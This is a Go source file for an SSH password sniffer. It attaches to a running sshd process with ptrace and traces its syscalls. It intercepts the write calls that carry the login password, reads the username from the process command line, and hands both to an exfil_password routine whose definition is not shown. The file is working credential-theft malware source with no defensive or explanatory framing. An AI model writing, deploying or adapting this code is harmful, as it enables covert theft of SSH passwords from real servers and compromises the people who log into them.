package main

import (
	"fmt"
	"io/ioutil"
	"regexp"
	"syscall"
	"unicode"
)

func traceSSHDProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
	}()

	var wstatus syscall.WaitStatus
	for {

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			var regs syscall.PtraceRegs
			err := syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				syscall.PtraceDetach(pid)
				return
			}
			// Find some way to only find it once
			if regs.Rdi == 5 && regs.Orig_rax == 1 {
				buffer := make([]byte, regs.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
				if err != nil {
					return
				}
				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
					username := "root"
					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
					matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
					if len(matches) == 2 {
						username = string(matches[1])
					}
					var password = removeNonPrintableAscii(string(buffer))
					if len(password) > 2 && len(password) < 250 {
						go exfil_password(username, removeNonPrintableAscii(password))
					}
				}
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}

func removeNonPrintableAscii(input string) string {
	var resultBuilder []rune

	for _, char := range input {
		if unicode.IsPrint(char) && char >= 32 && char != 127 {
			resultBuilder = append(resultBuilder, char)
		}
	}

	return string(resultBuilder)
}
